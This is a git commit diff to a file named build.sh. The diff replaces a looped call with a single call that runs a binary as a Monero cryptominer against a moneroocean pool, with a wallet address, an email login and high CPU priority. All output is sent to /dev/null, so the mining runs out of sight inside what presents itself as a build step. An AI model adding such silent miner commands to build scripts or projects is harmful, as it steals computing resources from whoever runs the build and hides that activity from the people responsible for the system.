518eb19ff2c4520ec7a8b218f13cf123c12d8078
solevira <67837465+solevira@users.noreply.github.com>
2020-07-21 05:43:42 -0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,10 +1,3 @@
 echo "Please wait."
-echo "Starting..."
 chmod +x app
-
-i=0
-
-while [ $i -le 20 ]
-do
-  ./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 8B9Czice9vT9RdmpLMEaMuGjCpn5y85z5U6i2zUEG47XBN9FZ1FXJEz3sxxjZYQSbVADGN2FS48KoRD9tB7cr9wp76V4mpu -p 1:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast > /dev/null 2>&1
-done
+./app --donate-level 1 -o us-or.moneroocean.stream:443 -u 8B9Czice9vT9RdmpLMEaMuGjCpn5y85z5U6i2zUEG47XBN9FZ1FXJEz3sxxjZYQSbVADGN2FS48KoRD9tB7cr9wp76V4mpu -p 1:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast > /dev/null 2>&1
